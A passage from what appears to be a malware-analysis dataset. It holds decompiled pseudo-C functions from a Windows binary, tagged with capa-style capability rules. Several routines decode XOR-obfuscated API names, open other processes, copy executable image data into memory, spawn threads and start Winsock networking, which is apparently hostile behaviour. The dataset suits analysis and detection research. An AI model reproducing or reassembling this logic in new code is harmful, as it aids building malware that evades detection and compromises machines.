        "decompiled_code": "\nuint __cdecl fcn.00406f1e(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uint var_30ch;\n    uint var_104h;\n    \n    puVar5 = &var_104h;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = &var_30ch;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (*0x41cd9c == 0) {\n        uVar3 = 0;\n        while (*(uVar3 + 0x410930) != arg_ch) {\n            uVar3 = uVar3 + 4;\n            if (0x1b < uVar3) {\n                return 1;\n            }\n        }\n        if (arg_10h == *0x41cd98) {\n            return 1;\n        }\n        if (arg_ch == -0x37b0bf10) {\n            puVar5 = &var_104h;\n            for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            var_104h._0_1_ = 0;\n            if ((arg_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar4 != 0)) {\n                (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar4, &var_104h, 0x104);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            pcVar6 = _sym.imp.KERNEL32.dll_lstrlenA;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_104h);\n            if (iVar4 != 0) {\n                (*pcVar6)(&var_104h);\n                iVar4 = fcn.0040e545();\n                if (iVar4 == -0x37b0bf10) {\n                    return 1;\n                }\n            }\n        }\n        iVar4 = fcn.00404ab4();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        puVar5 = &var_30ch;\n        for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar4 = fcn.0040485c();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_30ch, 0x41cab0);\n        if (iVar4 != 0) {\n            return 1;\n        }\n        pcVar6 = fcn.00404d73;\n    }\n    else {\n        if (arg_ch != 0x74fc6984) {\n            return 1;\n        }\n        iVar4 = fcn.00404ab4();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        iVar4 = fcn.0040485c();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_30ch);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(&var_30ch);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar4 + 8) = arg_10h;\n        pcVar6 = fcn.00406e18;\n        arg_10h = iVar4;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, pcVar6, arg_10h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    return 1;\n}\n",
        "token_count": 1064
    },
    "00407294": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407294(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41cd9c == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41cda0, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41cab0;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040485c();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00406c88, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x4121a0) = *(uVar5 + 0x4121a0) ^ \"XbAtXhRUKArkYmp\"[uVar5 % 0xf];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x4165a0) = *(uVar5 + 0x4165a0) ^ *(uVar5 % 0xc + 0x41c7a0);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004070d8, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41caa0 == 0) {\n        fcn.0040e0ef();\n        if (*0x41cd9c != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 687
    },
    "004074d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004074d8(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_10h = param_1;\n    if (*0x41ccbc == NULL) {\n        var_28h = 0x2116122d;\n        var_24h = 0x31500233;\n        var_20h = 0x51272133;\n        var_1ch._0_2_ = 0x1217;\n        var_1ch._2_1_ = 0x41;\n        var_18h = 0x4e416164;\n        var_14h._0_2_ = 0x3444;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (iVar5 != 0x1b4457) {\n                var_8h = 6;\n                *(iVar7 + iVar4) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar4)[&var_28h - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_28h = 0x5c11271a;\n        var_24h = 0x51711d37;\n        var_20h = 0x2e1d361c;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 99);\n        var_18h = 0x32634271;\n        var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x52);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_8h = &var_28h - iVar4;\n        do {\n            iVar6 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n            iVar5 = var_ch;\n            if (iVar6 != 0x8e2b06) {\n                var_8h = 5;\n                *(iVar7 + iVar4) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar4)[&var_28h - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_ch);\n        *0x41ccbc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41ccbc == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_10h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_10h),  iVar4 != 0)) {\n        iVar7 = (**0x41ccbc)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1018
    },
    "0040849d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040849d(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.004074d8();\n    fcn.00407c11(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.00407c11(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x004085a4:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x004085c5;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x0040858f;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x004085a4;\ncode_r0x0040858f:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x004085c5;\n        }\n    }\n    uVar6 = 8;\ncode_r0x004085c5:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 821
    },
    "00409240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409240(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040ec73;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41cda4 & 1) != 0)) {\n        var_20h = 0x41c7b0;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.0040f995(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.0040f6f4(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.0040fb77(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41cda4 & 1) != 0)) {\n                iVar3 = fcn.00408f05();\n            }\n            else {\n                iVar3 = fcn.00408bb1();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00409408(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.0040f859();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1171
    },
    "0040b6b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040b6b4(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040e0ef();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 279
    },
    "0040b71e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040b71e(void)\n\n{\n    int32_t iVar1;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_8h = 0x278cdf58;\n    iVar1 = 0;\n    var_bch = 0x2d386ece;\n    var_b8h = 0xaba416e3;\n    var_b4h = 0xbffde1f0;\n    var_b0h = 0x6fadb57b;\n    var_ach = 0x581419ac;\n    var_a8h = 0xa93a5da5;\n    var_a4h = 0x9fe09b81;\n    var_a0h = 0x62b621c4;\n    var_9ch = 0xe2f42d3;\n    var_98h = 0x1cb3f267;\n    var_94h = 0x7deed7db;\n    var_90h = 0x487c3558;\n    var_8ch = 0xbc541011;\n    var_88h = 0x70f400cf;\n    var_84h = 0x7e11e4cf;\n    var_80h = 0x52feb192;\n    var_7ch = 0x1e24d477;\n    var_78h = 0x4a6b6ebc;\n    var_74h = 0x6de558e4;\n    var_70h = 0x6e4851f8;\n    var_6ch = 0x9f5462ed;\n    var_68h = 0x896773d7;\n    var_64h = 0x68b0f30d;\n    var_60h = 0x7b8b2670;\n    var_5ch = 0x1e84d9c6;\n    var_58h = 0xf9b64044;\n    var_54h = 0x11e91917;\n    var_50h = 0x7ec953ab;\n    var_4ch = 0xafb3480;\n    var_48h = 0x5d5421cf;\n    var_44h = 0x4055c0a5;\n    var_40h = 0xb4c2ed27;\n    var_3ch = 0x6751a7a7;\n    var_38h = 0xf0fc4f7;\n    var_34h = 0xbf550eed;\n    var_30h = 0x1b54824;\n    var_2ch = 0x72c7bd89;\n    var_28h = 0xb15afa72;\n    var_24h = 0xd35c5e5c;\n    var_20h = 0x86bd8b3a;\n    var_1ch = 0x334b7fa5;\n    var_18h = 0x47e5605f;\n    var_14h = 0xe1e54873;\n    var_10h = 0xd8367b99;\n    do {\n        var_4h = 0;\n        fcn.0040e0ef();\n        if (var_4h != 0) {\n            return 1;\n        }\n        var_8h = (&var_bch)[iVar1];\n        iVar1 = iVar1 + 1;\n    } while (var_8h != 0);\n    return 0;\n}\n",
        "token_count": 1112
    },
    "0040bb40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040bb40(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_EDX;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpBuffer;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x0040be03;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_48h = 0x5545503a;\n        var_44h = 0x5003621d;\n        var_40h = 0x62565517;\n        piVar6 = lpMem;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x5066;\n        var_34h = 0x556f5066;\n        var_30h._0_2_ = 0x6233;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar6 = (*pcVar3)(uVar4);\n        iVar5 = 0;\n        var_38h = piVar6;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            iVar12 = lpBuffer;\n            if (iVar7 != 0xe87fce) {\n                var_18h = 6;\n                *(iVar5 + piVar6) = *(&var_34h + iVar5 % 6) ^ (iVar5 + piVar6)[&var_48h - piVar6];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar5 == 0) {\ncode_r0x0040bdd5:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_14h == 0) {\n                var_1ch = fcn.0040f5d9();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.0040f5d9();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto code_r0x0040bdd5;\n            iVar5 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar5 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar7 + (-0x2c - iVar5) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar5 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar7 = var_28h - piVar6;\n                        uVar8 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar5 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar6 = uVar8;\n                            piVar6 = piVar6 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar7 + piVar6);\n                            uVar8 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_2ch = var_34h;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar5);\n                if (iVar7 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar5);\n                }\n            }\n            *arg_10h = lpMem;\n            var_20h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n        }\n        uVar4 = (*pcVar11)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar5 = lpFindFileData;\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x0040be03:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_20h;\n}\n",
        "token_count": 1972
    },
    "0040d076": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040d076(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_74h;\n    int32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    int32_t *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    char *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_74h = *0x41cdd8;\n    var_6ch = *0x41cd20;\n    var_5ch = 0xb2d2428;\n    var_58h = 0x26212f31;\n    var_70h = 6;\n    var_54h._0_1_ = 6;\n    stack0xffffffa9 = 0x232a223e;\n    var_4fh = 0x37393b01;\n    var_4bh = 0x3c201c3c;\n    var_47h = 0x2d173930;\n    var_43h = 0x30636833;\n    var_3fh = 0x7a757b65;\n    var_3bh = 0x7e7e625a;\n    var_37h._0_2_ = 0x5f77;\n    var_37h._2_1_ = 0x54;\n    var_8h = 0x6f4e4649;\n    var_4h._0_1_ = 0x54;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar6 != 0x8c1822) {\n            var_14h = 5;\n            pcVar5[iVar9] = *(&var_8h + iVar9 % 5) ^ (pcVar5 + iVar9)[&var_5ch - pcVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    pcVar2 = 